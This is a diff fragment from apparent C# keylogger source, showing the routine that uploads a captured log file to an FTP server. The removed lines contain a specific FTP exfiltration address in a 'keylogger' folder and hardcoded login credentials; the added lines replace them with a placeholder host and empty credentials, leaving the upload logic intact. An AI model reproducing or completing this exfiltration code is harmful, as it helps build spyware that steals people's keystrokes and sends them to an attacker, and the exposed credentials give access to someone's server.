@@ -15,11 +15,11 @@ namespace Keylogger
         {
             if (!File.Exists(pathFile))
                 return;
-            var request =  (FtpWebRequest)WebRequest.Create("ftp://ftp.pymestudio.ml/public_ftp/keylogger/" + Path.GetFileName(pathFile));
+            var request =  (FtpWebRequest)WebRequest.Create("ftp://wwww" + Path.GetFileName(pathFile));
             request.Method = WebRequestMethods.Ftp.UploadFile;
 
             // This example assumes the FTP site uses anonymous logon.  
-            request.Credentials = new NetworkCredential("wvlaibfn", "hNc4e88Z2d");
+            request.Credentials = new NetworkCredential("", "");
 
             // Copy the contents of the file to the request stream. 
             try
